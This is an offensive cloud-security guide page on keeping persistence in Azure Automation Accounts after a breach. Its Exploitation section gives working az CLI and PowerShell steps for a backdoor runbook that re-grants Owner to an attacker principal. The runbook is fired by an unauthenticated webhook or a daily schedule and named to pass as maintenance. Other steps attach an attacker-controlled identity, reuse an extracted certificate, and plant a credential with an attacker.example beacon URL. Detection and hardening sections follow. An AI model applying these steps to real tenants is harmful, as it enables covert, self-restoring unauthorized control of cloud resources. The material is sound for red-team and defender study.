---
cstg_id: CSTG-AZURE-AUTOMATION-ACCOUNTS-PERSIST
title: "AZURE Automation Accounts - Persistence"
provider: azure
service: automation-accounts
phase: persistence
required_access: assumed-breach
required_permissions:
  - Microsoft.Automation/automationAccounts/runbooks/write
  - Microsoft.Automation/automationAccounts/runbooks/publish/action
  - Microsoft.Automation/automationAccounts/webhooks/action
  - Microsoft.Automation/automationAccounts/schedules/write
  - Microsoft.Automation/automationAccounts/jobSchedules/write
  - Microsoft.Automation/automationAccounts/credentials/write
  - Microsoft.Automation/automationAccounts/variables/write
  - Microsoft.Automation/automationAccounts/write
  - Microsoft.ManagedIdentity/userAssignedIdentities/assign/action
references:
  - "https://learn.microsoft.com/en-us/azure/automation/automation-webhooks"
  - "https://learn.microsoft.com/en-us/azure/automation/shared-resources/schedules"
  - "https://learn.microsoft.com/en-us/azure/automation/enable-managed-identity-for-automation"
  - "https://www.netspi.com/blog/technical-blog/cloud-pentesting/maintaining-azure-persistence-via-automation-accounts/"
  - "https://hackingthe.cloud/azure/"
license: CC BY-SA 4.0
---

## Summary

Automation Accounts are an effective persistence host because they combine durable, server-side code storage (runbooks) with multiple **automatic trigger mechanisms** (webhooks, schedules) and the ability to **attach privileged identities**. A backdoor placed here survives endpoint reimaging, user-credential rotation, and most workstation-focused IR, because it lives entirely in the Azure control plane and executes under a service identity rather than a user.

Persistence techniques fall into four categories:

1. **Triggered backdoor runbooks** — a runbook that re-establishes access (mints tokens, re-creates role assignments, beacons out) fired by a webhook or recurring schedule.
2. **Identity-based persistence** — attaching an attacker-controlled user-assigned managed identity, or retaining a legacy Run As certificate, so the account keeps acting as a controlled principal.
3. **Stored-secret persistence** — planting credential/variable assets that a triggered runbook reads to bootstrap re-access.
4. **Hybrid Worker footholds** — runbooks scheduled to execute on on-premises workers, persisting code execution inside the corporate network.

This page assumes an assumed-breach position with write access to an Automation Account established via [Automation Accounts - Privilege Escalation](../03-privilege-escalation/azure-automation-accounts-privesc.md). Enumeration of the targets is covered in [Automation Accounts - Enumeration](../02-services/azure-automation-accounts-enum.md).

## Prerequisites

- An authenticated principal with write/action permissions on the target Automation Account (see frontmatter). Webhook and schedule creation, runbook authoring, and asset writes are the key rights.
- An account identity to abuse: an existing privileged managed identity, the ability to attach a user-assigned identity, or a legacy Run As certificate.
- For Hybrid Worker persistence, a registered and online worker group.

## Enumeration

Identify the trigger surface and reusable identities already present:

```bash
# Existing schedules, jobs, and runbooks
az automation schedule list -g <rg> --automation-account-name <account> -o table
az automation runbook list  -g <rg> --automation-account-name <account> -o table

# Existing webhooks (URL token not shown after creation)
TOKEN=$(az account get-access-token --query accessToken -o tsv)
SUB=$(az account show --query id -o tsv)
curl -s -H "Authorization: Bearer $TOKEN" \
 "https://management.azure.com/subscriptions/$SUB/resourceGroups/<rg>/providers/Microsoft.Automation/automationAccounts/<account>/webhooks?api-version=2015-10-31"

# Attached identities and any legacy Run As connection/certificate
az automation account show -g <rg> -n <account> --query identity
az automation connection list -g <rg> --automation-account-name <account> -o table
```

## Misconfigurations & Findings

- Principals can create webhooks/schedules and author runbooks, enabling self-triggering backdoors.
- Account identity is privileged (Owner/Contributor/UAA) so a triggered runbook can re-grant access on demand.
- Ability to attach user-assigned managed identities, letting an attacker bind an identity they control roles on.
- Legacy Run As certificate present and exportable for off-box authentication.
- No alerting on runbook create/publish, webhook creation, or schedule changes.
- Hybrid Worker groups available for in-network execution persistence.

## Exploitation

### Backdoor runbook triggered by a webhook

Author a runbook that re-establishes access, then attach an unauthenticated webhook. Calling the URL fires the runbook with no Azure credentials.

```bash
# 1. Author + publish a backdoor runbook (body authenticates as the identity and re-grants access)
az automation runbook create -g <rg> --automation-account-name <account> -n maint-sync --type PowerShell
az automation runbook replace-content -g <rg> --automation-account-name <account> -n maint-sync --content @backdoor.ps1
az automation runbook publish -g <rg> --automation-account-name <account> -n maint-sync

# 2. Create a long-lived webhook — the full URL+token is returned ONLY here, capture it
az automation webhook create -g <rg> --automation-account-name <account> \
  -n maint-trigger --runbook-name maint-sync --expiry-time "2030-01-01T00:00:00Z" --is-enabled true
```

Trigger from anywhere, unauthenticated:

```bash
curl -s -X POST "<captured-webhook-url>" -H "Content-Type: application/json" -d '{}'
```

Example backdoor body that re-grants Owner to an attacker principal each time it runs:

```powershell
param([object]$WebhookData)
Connect-AzAccount -Identity | Out-Null
New-AzRoleAssignment -ObjectId "<attackerObjectId>" -RoleDefinitionName "Owner" -Scope "/subscriptions/<sub>" -ErrorAction SilentlyContinue
```

Naming the runbook and webhook to resemble legitimate maintenance jobs ("maint-sync", "update-mgmt") reduces the chance of discovery.

### Backdoor runbook on a recurring schedule

A schedule fires the runbook on a cadence with no external trigger needed, surviving even if webhooks are audited and removed.

```bash
az automation schedule create -g <rg> --automation-account-name <account> \
  -n daily-maint --frequency Day --interval 1 --start-time "2026-06-14T02:00:00Z"

# Link the schedule to the backdoor runbook (job schedule)
az automation job-schedule create -g <rg> --automation-account-name <account> \
  --runbook-name maint-sync --schedule-name daily-maint
```

The runbook re-mints tokens or re-applies role assignments on every run, automatically healing access the moment defenders revoke it — unless they also find and remove the runbook/schedule.

### Identity persistence: attach a user-assigned managed identity

Binding a user-assigned managed identity the attacker controls roles on to the account keeps a controllable, privileged principal attached even if the system-assigned identity is reviewed.

```bash
az automation account update -g <rg> -n <account> \
  --assign-identity "/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<uami>"
```

### Identity persistence: retain a Run As / extracted certificate

If the account has (or had) a Run As service principal, the certificate extracted during privilege escalation authenticates from any host independent of the Automation Account, surviving deletion of the runbook:

```bash
az login --service-principal -u <appId> -t <tenantId> -p <exported.pem> --password-protection false
```

Re-uploading a fresh certificate to the service principal (if the attacker controls it) extends validity further. This persists until the credential is rotated and the SP audited.

### Stored-secret persistence

Plant assets that a triggered runbook consumes to bootstrap re-entry, hiding the actual credential among legitimate automation assets:

```bash
az automation credential create -g <rg> --automation-account-name <account> \
  -n svc-monitor --user-name "attacker@contoso.onmicrosoft.com" --password "<pw>"
az automation variable create  -g <rg> --automation-account-name <account> \
  -n MonEndpoint --value "https://attacker.example/beacon" --encrypted true
```

### Hybrid Worker persistence

Scheduling a backdoor runbook against a Hybrid Worker group keeps recurring code execution on an in-network host (often as SYSTEM), independent of Azure sandbox controls:

```bash
az automation job-schedule create -g <rg> --automation-account-name <account> \
  --runbook-name maint-sync --schedule-name daily-maint --run-on <hybridWorkerGroup>
```

## Detection & Logging

- **Azure Activity Logs** record the persistence-establishing operations: `Microsoft.Automation/automationAccounts/webhooks/action`, `.../schedules/write`, `.../jobSchedules/write`, `.../runbooks/write` + publish, `.../credentials/write`, `.../variables/write`, and `Microsoft.Automation/automationAccounts/write` (identity attach). New webhooks and new schedules linked to newly created runbooks are the highest-value alerts.
- **Automation Job logs / Job Streams** show recurring executions; a runbook that runs on a schedule and emits role assignments or outbound beacons is detectable when forwarded to Log Analytics.
- **Entra ID audit logs** record new role assignments created by the account identity and any directory changes; managed-identity sign-ins from non-Azure IPs (re-used stolen tokens) appear in sign-in logs.
- Webhook invocations create job records but the **inbound HTTP call is anonymous** — correlate unexpected job starts having no initiating user with webhook-triggered runbooks.
- Attaching a user-assigned identity or changing the account's identity block is a notable, rare control-plane event.

## Remediation & Hardening

- Periodically inventory and review all runbooks, webhooks, schedules, job schedules, and attached identities; alert on creation of any of these. Treat unexpected webhooks/schedules as incidents.
- Set short, mandatory expiry on webhooks and rotate/regenerate them; disable webhooks that are not actively required.
- Lock down `Microsoft.Automation/automationAccounts/*/write` and webhook/schedule actions to a minimal, audited set of principals.
- Remove legacy Run As accounts and their certificate assets; rotate any service-principal credentials suspected of exposure.
- Constrain which user-assigned managed identities may be attached, and review the account's identity configuration for unexpected bindings.
- Forward JobLogs and JobStreams to Log Analytics; alert on runbook create/publish, schedule/job-schedule creation, and managed-identity sign-ins from unexpected IPs.
- Store secrets in Key Vault rather than credential/variable assets, and review existing assets for unfamiliar entries.
- Run Hybrid Workers under least-privileged accounts and monitor worker job execution.

## Tools

- **Azure CLI (az)** / **Azure PowerShell (Az.Automation)** — create runbooks, webhooks, schedules, job schedules, and assets; attach identities.
- **PowerZure** — automates backdoor runbook and webhook persistence on Automation Accounts.
- **MicroBurst** — Automation persistence and secret-planting helpers.
- **Azure REST API** — direct webhook/schedule/identity operations.

## References

- Automation webhooks — https://learn.microsoft.com/en-us/azure/automation/automation-webhooks
- Automation schedules — https://learn.microsoft.com/en-us/azure/automation/shared-resources/schedules
- Managed identity for Automation — https://learn.microsoft.com/en-us/azure/automation/enable-managed-identity-for-automation
- Maintaining Azure persistence via Automation Accounts — https://www.netspi.com/blog/technical-blog/cloud-pentesting/maintaining-azure-persistence-via-automation-accounts/
- hackingthe.cloud Azure section — https://hackingthe.cloud/azure/
